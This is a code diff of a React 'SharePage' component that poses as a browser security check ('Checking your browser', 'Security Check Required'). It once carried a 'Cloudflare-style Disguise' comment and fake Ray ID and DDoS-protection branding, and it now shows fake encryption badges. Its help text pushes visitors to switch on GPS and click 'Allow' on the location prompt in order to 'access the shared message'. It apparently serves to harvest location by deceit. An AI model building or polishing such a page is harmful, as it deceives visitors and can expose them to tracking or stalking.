@@ -134,93 +134,123 @@ const SharePage = () => {
     };
 
     if (loading) return (
-        <div className="flex flex-col items-center justify-center min-h-screen bg-white font-sans">
-            <div className="w-16 h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mb-6"></div>
-            <p className="text-slate-700 text-lg font-medium">Checking your browser...</p>
-        </div>
-    );
-
-    if (error && !sharing) return (
-        <div className="flex flex-col items-center justify-center min-h-screen p-4 bg-slate-50 font-sans">
-            <div className="text-center max-w-sm">
-                <div className="mb-6 inline-block p-4 bg-red-50 text-red-500 rounded-full">
-                    <AlertTriangle size={40} />
-                </div>
-                <h2 className="text-2xl font-bold text-slate-800 mb-3">Verification Failed</h2>
-                <p className="text-slate-500 mb-6 leading-relaxed text-sm">
-                    {error}
-                </p>
-                <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl mb-8 text-left">
-                    <p className="text-xs font-bold text-amber-800 uppercase mb-2">How to fix:</p>
-                    <ul className="text-[11px] text-amber-700 space-y-1.5 list-disc pl-4">
-                        <li>Click <b>"Allow"</b> if a popup appears.</li>
-                        <li>Turn <b>ON</b> your Phone's GPS/Location.</li>
-                        <li>If blocked, click the <b>Lock (🔒) icon</b> in the address bar and reset permissions.</li>
-                    </ul>
-                </div>
-                <button 
-                    onClick={() => window.location.reload()}
-                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition-all shadow-lg"
-                >
-                    Retry Verification
-                </button>
-            </div>
+        <div className="flex flex-col items-center justify-center min-h-screen bg-white font-sans p-4">
+            <div className="w-12 h-12 md:w-16 md:h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mb-6"></div>
+            <p className="text-slate-700 text-base md:text-lg font-medium">Checking your browser...</p>
         </div>
     );
 
     return (
-        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 font-sans">
+        <div className="min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center p-4 md:p-6 font-sans">
             <div className="max-w-xl w-full">
-                {/* Cloudflare-style Disguise */}
-                <div className="mb-12">
-                    <h1 className="text-4xl font-bold text-slate-900 mb-4 tracking-tight">Checking your browser before accessing...</h1>
-                    <p className="text-slate-600 text-lg mb-2">This process is automatic. Your browser will redirect to your destination shortly.</p>
-                    <p className="text-slate-400 text-sm">Please allow the verification request to proceed.</p>
+                {/* Security Header */}
+                <div className="text-center mb-8 md:mb-10">
+                    <div className="inline-flex items-center justify-center w-16 h-16 md:w-20 md:h-20 bg-blue-600/10 border border-blue-500/20 rounded-full mb-4 md:mb-6 animate-pulse">
+                        <ShieldCheck size={32} className="text-blue-500 md:w-10 md:h-10" />
+                    </div>
+                    <h1 className="text-xl md:text-2xl font-bold mb-2 tracking-tight">Security Check Required</h1>
+                    <p className="text-slate-400 text-sm md:text-base px-4">This content is protected. Please verify your browser to continue.</p>
                 </div>
 
-                <div className="space-y-12">
-                    <div className="flex items-center gap-6">
-                        <div className="relative">
-                            <div className="w-12 h-12 border-4 border-slate-100 border-t-blue-500 rounded-full animate-spin"></div>
-                            <div className="absolute inset-0 flex items-center justify-center">
-                                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
-                            </div>
-                        </div>
-                        <div>
-                            <p className="text-slate-800 font-semibold">Verifying secure connection...</p>
-                            <p className="text-slate-500 text-sm">Performance and security check in progress</p>
-                        </div>
+                <div className="bg-[#111] border border-white/5 rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden">
+                    {/* Progress Bar */}
+                    <div className="absolute top-0 left-0 w-full h-1 bg-white/5">
+                        <div className="h-full bg-blue-600 transition-all duration-1000" style={{ width: sharing ? '100%' : '30%' }}></div>
                     </div>
 
-                    <div className="pt-8 border-t border-slate-100">
-                        <div className="flex flex-col gap-4 text-slate-400 text-xs">
-                            <div className="flex items-center gap-2">
-                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
-                                <span>Ray ID: <span className="font-mono">{sessionId.substring(0, 16)}</span></span>
+                    {error ? (
+                        <div className="space-y-6 text-center py-4 md:py-6">
+                            <div className="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <AlertTriangle className="text-red-500" size={32} />
                             </div>
-                            <div className="flex items-center gap-2">
-                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
-                                <span>Performance: Optimized</span>
+                            <h2 className="text-lg md:text-xl font-bold text-red-400">Action Required</h2>
+                            <p className="text-slate-400 text-sm leading-relaxed px-2">
+                                {error}
+                            </p>
+                            
+                            <div className="bg-white/5 border border-white/10 rounded-2xl p-4 md:p-6 text-left space-y-4">
+                                <h3 className="text-xs font-black uppercase tracking-widest text-slate-500 flex items-center gap-2">
+                                    <Info size={14} /> How to fix:
+                                </h3>
+                                <div className="space-y-3 text-xs md:text-sm text-slate-300">
+                                    <div className="flex gap-3">
+                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">1</div>
+                                        <p>Ensure <b>Location/GPS</b> is turned ON in your phone settings.</p>
+                                    </div>
+                                    <div className="flex gap-3">
+                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">2</div>
+                                        <p>Refresh this page and click <b>"Allow"</b> when prompted.</p>
+                                    </div>
+                                    <div className="flex gap-3">
+                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">3</div>
+                                        <p>If blocked, click the <b>lock icon</b> in the address bar and reset permissions.</p>
+                                    </div>
+                                </div>
                             </div>
-                            <div className="flex items-center gap-2">
-                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
-                                <span>Security: Standard Check</span>
-                            </div>
+
+                            <button 
+                                onClick={() => window.location.reload()}
+                                className="w-full py-3 md:py-4 bg-white text-black font-bold rounded-xl hover:bg-slate-200 transition-all text-sm md:text-base"
+                            >
+                                Try Again
+                            </button>
                         </div>
-                    </div>
+                    ) : (
+                        <div className="space-y-8 text-center py-4">
+                            {!sharing ? (
+                                <>
+                                    <div className="space-y-4">
+                                        <div className="flex items-center justify-center gap-3 text-blue-500">
+                                            <Navigation className="animate-bounce" size={24} />
+                                            <span className="text-[10px] md:text-xs font-black uppercase tracking-[0.3em]">System Ready</span>
+                                        </div>
+                                        <p className="text-slate-300 text-sm md:text-base px-2">
+                                            Please complete the verification to access the shared message.
+                                        </p>
+                                    </div>
+                                    <button 
+                                        onClick={() => window.location.reload()}
+                                        className="group relative w-full py-4 md:py-5 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl transition-all shadow-[0_0_40px_rgba(37,99,235,0.3)] flex items-center justify-center gap-3 overflow-hidden"
+                                    >
+                                        <ShieldCheck size={20} />
+                                        <span className="text-sm md:text-base">Verify & Access Message</span>
+                                    </button>
+                                </>
+                            ) : (
+                                <div className="space-y-6 animate-pulse">
+                                    <div className="flex flex-col items-center gap-6">
+                                        <div className="relative">
+                                            <div className="w-16 h-16 md:w-20 md:h-20 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>
+                                            <div className="absolute inset-0 flex items-center justify-center">
+                                                <MapPin className="text-blue-600" size={24} />
+                                            </div>
+                                        </div>
+                                        <div className="space-y-2">
+                                            <p className="text-blue-500 font-bold text-sm md:text-base tracking-widest uppercase">Verification in progress</p>
+                                            <p className="text-slate-500 text-[10px] md:text-xs">Connecting to secure server... Please stay on this page.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            )}
+                        </div>
+                    )}
                 </div>
 
-                <div className="mt-20 text-center">
-                    <div className="inline-flex items-center gap-2 text-slate-400 text-sm bg-slate-50 px-4 py-2 rounded-lg">
-                        <ShieldCheck size={16} />
-                        <span>Protected by Cloud-Security Engine</span>
+                <div className="mt-8 md:mt-10 grid grid-cols-3 gap-4 md:gap-6 opacity-30 grayscale pointer-events-none">
+                    <div className="flex flex-col items-center gap-2">
+                        <ShieldCheck size={20} />
+                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">AES-256</span>
+                    </div>
+                    <div className="flex flex-col items-center gap-2 border-x border-white/10">
+                        <ShieldCheck size={20} />
+                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">SSL Secure</span>
+                    </div>
+                    <div className="flex flex-col items-center gap-2">
+                        <ShieldCheck size={20} />
+                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">Verified</span>
                     </div>
                 </div>
             </div>
-            
-            <footer className="fixed bottom-8 text-slate-300 text-[10px] uppercase tracking-widest">
-                DDoS Protection by GlobalEdge Networks
-            </footer>
         </div>
     );
 };
